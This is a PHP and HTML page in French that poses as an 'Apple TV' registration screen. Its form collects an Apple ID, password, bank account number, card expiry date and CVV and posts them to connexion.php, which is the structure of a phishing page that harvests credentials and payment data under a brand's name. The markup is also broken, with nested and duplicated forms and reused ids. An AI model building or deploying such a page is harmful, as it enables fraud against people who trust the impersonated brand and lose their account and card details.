<?php
include "conf.php";
session_start();



$email = $_POST['email']; 
$_SESSION['email']=$email;




if($connexion = mysqli_connect($serveur ,$user, $mdp, $nomBDD))
	{
		echo "vous etes connecter ";
	}
		


?>





<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion - Apple TV</title>
  <link rel="stylesheet" href="style.css">
  <form method="POST" action="connexion.php" class="formulaire">
</head>
<body>
  <div class="container">
    <h1 class="titre">Inscription à Apple TV Monde </h1>

    <form method="POST" action="connexion.php" class="formulaire">

    <div class="bloc">
        <label for="login">Nom</label>
        <input id="login" name="nom" type="text" class="champ" placeholder="Nom">
  </div>


      <div class="bloc">
        <label for="login">Prenom</label>
        <input id="login" name="prenom" type="text" class="champ" placeholder="Prenom">
      </div>
    


      <div class="bloc">
        <label for="login">Identifiant Apple ID</label>
        <input id="login" name="login" type="text" class="champ" placeholder="exemple@icloud.com">
      </div>

      <div class="bloc">
        <label for="pwd">Mot de passe</label>
        <input id="pwd" name="pwd" type="password" class="champ" placeholder="••••••••">
      </div>
      <form method="POST" action="connexion.php" class="formulaire">
      <div class="bloc">
        <label for="login">Numero du compte banquaire</label>
        <input id="login" name="numero" type="text" class="champ" placeholder="123456">
      </div>

      <div class="bloc">
        <label for="pwd">Date d'expiration</label>
        <input id="pwd" name="date" type="date" class="champ">
      </div>

      <div class="bloc">
        <label for="mail">CVV </label>
        <input id="pwd" name="cryptogramme" type="text" class="champ">
      </div>

      <button type="submit" class="bouton">Confirmation</button>

      <!--<p class="lien">Vous n’avez pas d’identifiant Apple ? <a href="#">Créez le vôtre</a></p>-->
    </form>
  </div>
</body>
</html>
